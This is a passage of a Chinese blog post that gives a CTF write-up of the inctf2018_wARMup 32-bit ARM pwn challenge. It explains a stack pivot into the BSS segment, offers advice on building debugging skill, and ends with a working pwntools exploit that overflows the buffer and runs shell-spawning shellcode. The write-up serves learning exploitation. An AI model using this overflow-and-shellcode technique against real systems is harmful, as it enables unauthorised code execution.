+<p><strong>这道题我有的地方写的是R11（是因为IDA上看是R11），有的地方写的fp（因为gdb里看的是fp)，实际上这俩就是一个东西。</strong></p>
+<h2 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h2><p>栈迁移的话，考虑迁移到BSS段，同时观察汇编，发现read的第二个参数（即输入的地址）是由R3传递的，而R3的值是由R11来传递的</p>
+<p><img src="/upload/img/image-20220411120608563.png" alt="image-20220411120608563"></p>
+<p>同时在最后，又有一个pop指令来控制R11和PC，因此我们是可以控制R11（也就是read的第二个参数)和程序执行流的（PC）</p>
+<p><img src="/upload/img/image-20220411120618160.png" alt="image-20220411120618160"></p>
+<p>经过调试发现，这个fp距离我们输入起始的地址偏移为100,这就意味着我们需要填充100个垃圾数据，然后来控制fp以及pc。</p>
+<p>因此第一次输入的时候，控制fp，让其为bss段地址（迁移的时候bss段尽量抬高），然后将返回地址read地址，再跑一次，让我们的第二次payload输入到bss段。</p>
+<p><strong>arm架构（32位）的bss段是可执行的，尽管用vmmap看的是可写不可执行（但是布置进去的shellcode确实可以执行）</strong></p>
+<p>因此我们就要把shellcode布置在bss段。这道题是十分锻炼自主的调试能力的，可以看见我的exp是在shellcode前面布置了两个内容，这里我并不想解释原因。最开始我自己做这道题的时候并没有写这两个内容，当时我认为直接把bss段写shellcode就行，然后控制PC指针执行过去，<strong>事实上这样做是错误的</strong>。原因请自主调试，这里考察了自主调试来布局payload（如果你可以眼睛看出来payload整体布局的话，当我什么都没说），如果连这里到最后都不理解而且还稀里糊涂的交了flag的话，那做这道题是毫无意义的。</p>
+<p>大致思路就是这样（第二次输入布置shellcode，然后控制PC寄存器，将其指向shellcode的位置）剩下的具体细节真的没有办法记录，因为剩下的布局都是一点一点调试出来的。</p>
+<h2 id="关于对调试能力的总结："><a href="#关于对调试能力的总结：" class="headerlink" title="关于对调试能力的总结："></a>关于对调试能力的总结：</h2><p>我这里说一下我从刚开始学pwn，到现在也刚好是四个月了。总结了一下的调试经验（有可能在各位师傅面前算是班门弄斧了，但这依然是对这四个月所掌握的调试能力的一个记录）。</p>
+<p>第一，你要时刻清楚你自己想要看的内容以及自己卡在了哪里</p>
+<p>第二，在调试的过程中，遇到卡住的地方，要思考为什么会这样。</p>
+<p>第三，在锻炼调试能力的时候，刚开始有的地方可能不知道卡住的原因是什么，建议找一份可以打通（和你思路相近的）的exp，去调试一下，再反复对比自己exp的动态调试，这样很容易找到问题。</p>
+<p>第四，就是可能你认为你的思路很对，但就是打不通，而别人的思路都和你的不一样，<strong>由衷建议，不要放弃你的思路，到最后无非是两种可能，你通过坚持以及思考打通了自己的exp，又或者是你通过反复调试，最后发现自己的思路是错误的，不可行的。但其实不论结果，这个坚持的过程已经让你的调试能力有了不小的进步。</strong></p>
+<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;arm&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,26705)</span></span><br><span class="line"><span class="comment">#p=process([&quot;qemu-arm&quot;, &quot;-L&quot;, &quot;/usr/arm-linux-gnueabihf&quot;, &quot;./armup_buu&quot;])</span></span><br><span class="line">p=process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabihf&quot;</span>, <span class="string">&quot;./armup_buu&quot;</span>])</span><br><span class="line">e=ELF(<span class="string">&#x27;./armup_buu&#x27;</span>)</span><br><span class="line">bss_addr=<span class="number">0x21000</span>+<span class="number">0x600</span></span><br><span class="line">read_addr=<span class="number">0x0001052C</span></span><br><span class="line">offset=<span class="number">100</span></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">payload=offset*<span class="string">&#x27;a&#x27;</span>+p32(bss_addr+<span class="number">0x68</span>)+p32(read_addr)<span class="comment">#因为sub减去了0x68，所以这里提前加上0x68</span></span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">shellcode=p32(<span class="number">0</span>)+p32(bss_addr+<span class="number">8</span>)+asm(shellcraft.sh())</span><br><span class="line">payload=shellcode</span><br><span class="line">payload=payload.ljust(<span class="number">0x64</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p32(bss_addr+<span class="number">4</span>)+p32(<span class="number">0x10548</span>)<span class="comment">#bss_addr+4是将sp设置成bss_addr（不过这一步只是将参数给R11，将sp赋值是下面的操作）    将pc设置为0x10548的目的是再执行一遍 SUB     SP, R11     POP     &#123;R11,PC&#125;</span></span><br><span class="line"><span class="comment">#这样来修改sp的值，如果不修改sp的值的话，执行shellcode的时候，有个指令会将栈里（此时是bss段）的值修改，从而导致shellcode执行失败。</span></span><br><span class="line"><span class="comment">#上述的内容用一句话说就是，要将栈迁移到执行流的地方。不然shellcode会把自身给破坏了... 要是不相信的话，可以不要这两个指令，然后调试一下，就明白咋回事了</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="尾声："><a href="#尾声：" class="headerlink" title="尾声："></a>尾声：</h1><p>这次学习了arm架构下的pwn题，这意味着在学习pwn的过程中，对于栈的学习已经到了尾声，之后的打算是再学习一下mips架构下的pwn题，然后再练几道稍微难点的栈题，就准备进入堆的部分了。</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>ZIKH26
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://zikh26.github.io/2022/04/26/arm/" title="关于学习arm架构下的pwn的总结">https://zikh26.github.io/2022/04/26/arm/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/PWN/" rel="tag"># PWN</a>
+              <a href="/tags/ARM/" rel="tag"># ARM</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/04/26/biji_diyizhang/" rel="prev" title="第一章 计算机系统漫游（深入理解计算机系统笔记）">
+      <i class="fa fa-chevron-left"></i> 第一章 计算机系统漫游（深入理解计算机系统笔记）
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/04/26/%5BGKCTF%202021%5Dcheckin/" rel="next" title="GKCTF 2021_checkin">
+      GKCTF 2021_checkin <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F-amp-amp-%E5%90%AF%E5%8A%A8%E8%B0%83%E8%AF%95"><span class="nav-number">1.</span> <span class="nav-text">运行程序&amp;&amp;启动调试</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F"><span class="nav-number">1.1.</span> <span class="nav-text">运行程序</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%AF%E5%8A%A8%E8%B0%83%E8%AF%95"><span class="nav-number">1.2.</span> <span class="nav-text">启动调试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%81%87%E8%A7%81%E7%9A%84%E6%8A%A5%E9%94%99"><span class="nav-number">1.3.</span> <span class="nav-text">遇见的报错</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#typo"><span class="nav-number">2.</span> <span class="nav-text">typo</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="nav-number">2.1.</span> <span class="nav-text">总结：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4%E7%AD%96%E7%95%A5"><span class="nav-number">2.2.</span> <span class="nav-text">保护策略</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IDA%E5%88%86%E6%9E%90"><span class="nav-number">2.3.</span> <span class="nav-text">IDA分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%92%E5%85%A5%E4%B8%80%E7%82%B9%EF%BC%9A%E5%A6%82%E6%9E%9C%E4%B8%8D%E8%BE%93%E5%85%A5%E5%9B%9E%E8%BD%A6%E5%91%A2%EF%BC%9F"><span class="nav-number">2.3.1.</span> <span class="nav-text">插入一点：如果不输入回车呢？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#arm%E6%9E%B6%E6%9E%84%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86"><span class="nav-number">2.4.</span> <span class="nav-text">arm架构的基本知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#arm32%E4%BD%8D"><span class="nav-number">2.4.1.</span> <span class="nav-text">arm32位</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP%EF%BC%9A"><span class="nav-number">2.5.</span> <span class="nav-text">EXP：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shanghai2018-%E2%80%93-baby-arm"><span class="nav-number">3.</span> <span class="nav-text">Shanghai2018 – baby_arm</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A-1"><span class="nav-number">3.1.</span> <span class="nav-text">总结：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4%E7%AD%96%E7%95%A5%EF%BC%9A"><span class="nav-number">3.2.</span> <span class="nav-text">保护策略：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%9A"><span class="nav-number">3.3.</span> <span class="nav-text">程序分析：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="nav-number">3.4.</span> <span class="nav-text">解题过程：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%AB%E6%8C%81%E6%89%A7%E8%A1%8C%E6%B5%81"><span class="nav-number">3.4.1.</span> <span class="nav-text">劫持执行流</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2csu"><span class="nav-number">3.4.2.</span> <span class="nav-text">ret2csu?</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP"><span class="nav-number">3.5.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#inctf2018-wARMup"><span class="nav-number">4.</span> <span class="nav-text">inctf2018_wARMup</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">4.1.</span> <span class="nav-text">总结:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4%E7%AD%96%E7%95%A5%EF%BC%9A-1"><span class="nav-number">4.2.</span> <span class="nav-text">保护策略：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%9A-1"><span class="nav-number">4.3.</span> <span class="nav-text">程序分析：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%A7%E8%87%B4%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="nav-number">4.4.</span> <span class="nav-text">大致思路：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E%E5%AF%B9%E8%B0%83%E8%AF%95%E8%83%BD%E5%8A%9B%E7%9A%84%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="nav-number">4.5.</span> <span class="nav-text">关于对调试能力的总结：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP-1"><span class="nav-number">4.6.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B0%BE%E5%A3%B0%EF%BC%9A"><span class="nav-number">5.</span> <span class="nav-text">尾声：</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ZIKH26"
+      src="/images/20220411214643.jpg">
+  <p class="site-author-name" itemprop="name">ZIKH26</p>
+  <div class="site-description" itemprop="description">未来一位优秀的pwner的博客</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ZIKH26" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ZIKH26" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ZIKH26</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
